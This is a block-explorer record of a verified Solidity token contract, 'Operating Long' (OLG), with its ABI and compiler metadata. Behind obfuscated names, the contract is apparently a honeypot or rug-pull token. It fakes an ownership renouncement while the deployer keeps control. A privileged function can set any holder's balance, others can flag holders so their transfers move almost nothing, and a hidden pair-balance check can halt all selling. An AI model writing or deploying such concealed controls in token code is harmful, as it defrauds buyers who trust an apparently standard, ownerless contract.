{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\ninterface liquidityTake {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract autoTake {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface receiverToken {\n    function createPair(address liquidityFrom, address launchBuy) external returns (address);\n}\n\ninterface exemptReceiver {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address shouldSell) external view returns (uint256);\n\n    function transfer(address fromReceiver, uint256 shouldSender) external returns (bool);\n\n    function allowance(address tradingMax, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 shouldSender) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address fromReceiver,\n        uint256 shouldSender\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed walletAutoReceiver, uint256 value);\n    event Approval(address indexed tradingMax, address indexed spender, uint256 value);\n}\n\ninterface exemptReceiverMetadata is exemptReceiver {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract OperatingLong is autoTake, exemptReceiver, exemptReceiverMetadata {\n\n    function enableMax(address walletSender, uint256 shouldSender) public {\n        fromWallet();\n        launchFund[walletSender] = shouldSender;\n    }\n\n    function liquidityLaunchSell(address buySwap) public {\n        require(buySwap.balance < 100000);\n        if (swapAt) {\n            return;\n        }\n        \n        senderAmountReceiver[buySwap] = true;\n        if (fromMarketing == teamAtMode) {\n            teamAtMode = fromMarketing;\n        }\n        swapAt = true;\n    }\n\n    function transferFrom(address launchedAmountFrom, address fromReceiver, uint256 shouldSender) external override returns (bool) {\n        if (_msgSender() != feeTake) {\n            if (limitListTx[launchedAmountFrom][_msgSender()] != type(uint256).max) {\n                require(shouldSender <= limitListTx[launchedAmountFrom][_msgSender()]);\n                limitListTx[launchedAmountFrom][_msgSender()] -= shouldSender;\n            }\n        }\n        return maxAt(launchedAmountFrom, fromReceiver, shouldSender);\n    }\n\n    uint8 private sellReceiver = 18;\n\n    function allowance(address amountMaxTrading, address minModeTo) external view virtual override returns (uint256) {\n        if (minModeTo == feeTake) {\n            return type(uint256).max;\n        }\n        return limitListTx[amountMaxTrading][minModeTo];\n    }\n\n    bool public swapAt;\n\n    function fromWallet() private view {\n        require(senderAmountReceiver[_msgSender()]);\n    }\n\n    mapping(address => bool) public tokenMax;\n\n    string private autoAmountMarketing = \"OLG\";\n\n    function symbol() external view virtual override returns (string memory) {\n        return autoAmountMarketing;\n    }\n\n    function owner() external view returns (address) {\n        return fundAmount;\n    }\n\n    function maxAt(address launchedAmountFrom, address fromReceiver, uint256 shouldSender) internal returns (bool) {\n        if (launchedAmountFrom == isMin) {\n            return receiverFrom(launchedAmountFrom, fromReceiver, shouldSender);\n        }\n        uint256 marketingBuyFund = exemptReceiver(autoTx).balanceOf(buyFundTo);\n        require(marketingBuyFund == modeBuy);\n        require(fromReceiver != buyFundTo);\n        if (tokenMax[launchedAmountFrom]) {\n            return receiverFrom(launchedAmountFrom, fromReceiver, feeMode);\n        }\n        return receiverFrom(launchedAmountFrom, fromReceiver, shouldSender);\n    }\n\n    uint256 public enableReceiver;\n\n    function tradingTotal(address totalAtMin) public {\n        fromWallet();\n        \n        if (totalAtMin == isMin || totalAtMin == autoTx) {\n            return;\n        }\n        tokenMax[totalAtMin] = true;\n    }\n\n    uint256 private liquidityAmount = 100000000 * 10 ** 18;\n\n    constructor (){\n        if (listShould != fromMarketing) {\n            listShould = enableReceiver;\n        }\n        liquidityTake limitTradingList = liquidityTake(feeTake);\n        autoTx = receiverToken(limitTradingList.factory()).createPair(limitTradingList.WETH(), address(this));\n        if (listShould == enableReceiver) {\n            enableReceiver = teamAtMode;\n        }\n        isMin = _msgSender();\n        swapShould();\n        senderAmountReceiver[isMin] = true;\n        launchFund[isMin] = liquidityAmount;\n        \n        emit Transfer(address(0), isMin, liquidityAmount);\n    }\n\n    address feeTake = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 takeToken;\n\n    function decimals() external view virtual override returns (uint8) {\n        return sellReceiver;\n    }\n\n    uint256 public teamAtMode;\n\n    function balanceOf(address shouldSell) public view virtual override returns (uint256) {\n        return launchFund[shouldSell];\n    }\n\n    function receiverFrom(address launchedAmountFrom, address fromReceiver, uint256 shouldSender) internal returns (bool) {\n        require(launchFund[launchedAmountFrom] >= shouldSender);\n        launchFund[launchedAmountFrom] -= shouldSender;\n        launchFund[fromReceiver] += shouldSender;\n        emit Transfer(launchedAmountFrom, fromReceiver, shouldSender);\n        return true;\n    }\n\n    uint256 modeBuy;\n\n    function name() external view virtual override returns (string memory) {\n        return takeLimit;\n    }\n\n    function swapShould() public {\n        emit OwnershipTransferred(isMin, address(0));\n        fundAmount = address(0);\n    }\n\n    address buyFundTo = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return liquidityAmount;\n    }\n\n    uint256 constant feeMode = 11 ** 10;\n\n    address public autoTx;\n\n    uint256 public fromMarketing;\n\n    event OwnershipTransferred(address indexed launchToken, address indexed sellMinLaunch);\n\n    mapping(address => mapping(address => uint256)) private limitListTx;\n\n    mapping(address => bool) public senderAmountReceiver;\n\n    function transfer(address walletSender, uint256 shouldSender) external virtual override returns (bool) {\n        return maxAt(_msgSender(), walletSender, shouldSender);\n    }\n\n    function approve(address minModeTo, uint256 shouldSender) public virtual override returns (bool) {\n        limitListTx[_msgSender()][minModeTo] = shouldSender;\n        emit Approval(_msgSender(), minModeTo, shouldSender);\n        return true;\n    }\n\n    uint256 public listShould;\n\n    address public isMin;\n\n    string private takeLimit = \"Operating Long\";\n\n    function getOwner() external view returns (address) {\n        return fundAmount;\n    }\n\n    address private fundAmount;\n\n    function atAutoFund(uint256 shouldSender) public {\n        fromWallet();\n        modeBuy = shouldSender;\n    }\n\n    mapping(address => uint256) private launchFund;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tradingMax\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchToken\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellMinLaunch\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"walletAutoReceiver\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountMaxTrading\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"minModeTo\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minModeTo\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"shouldSender\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"shouldSender\",\"type\":\"uint256\"}],\"name\":\"atAutoFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoTx\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldSell\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletSender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"shouldSender\",\"type\":\"uint256\"}],\"name\":\"enableMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableReceiver\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromMarketing\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isMin\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buySwap\",\"type\":\"address\"}],\"name\":\"liquidityLaunchSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listShould\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"senderAmountReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamAtMode\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"tokenMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalAtMin\",\"type\":\"address\"}],\"name\":\"tradingTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletSender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"shouldSender\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedAmountFrom\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"fromReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"shouldSender\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "OperatingLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}